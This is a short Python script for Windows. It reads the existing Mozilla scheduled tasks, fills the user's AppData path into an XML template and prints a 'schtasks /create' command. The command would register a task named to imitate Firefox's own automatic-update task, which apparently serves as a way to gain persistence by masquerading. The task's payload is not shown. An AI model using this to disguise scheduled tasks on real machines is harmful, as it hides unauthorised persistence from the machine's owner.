import os
import re

# FOLDER = 'C:\\Users\\Gimli\\AppData\\Roaming'

mozRef = re.compile("^\"(.{1}Mozilla.*)\",\".*\",.*$", re.MULTILINE)
taskNames = mozRef.findall(os.popen("schtasks /query /FO csv").read())

if len(taskNames) > 0:
    number = taskNames[0].split(" ")[-1]

    user = os.popen("whoami").read().replace("\n", "")
    username = user.split("\\")[-1]

    with open('Firefox Automatic Updates 308046B0AF4A39CB.xml', "r") as readFile:
        with open(f'Firefox Automatic Updates {number}.xml', "w+") as writeFile:
            writeFile.write(readFile.read().replace("%APPDATA%",
                                                    f'C:\\Users\\{username}\\AppData\\Roaming'))

    # os.popen(
    print(
        f'schtasks /create /xml "Firefox Automatic Updates {number}.xml" /tn "\Mozilla\Firefox Automatic Updates {number}" /ru {user}')

# schtasks /create /xml "Firefox Automatic Updates 308046B0AF4A39CB.xml" /tn "\Mozilla\Firefox Automatic Updates 308046B0AF4A39CB" /ru erebor\gimli
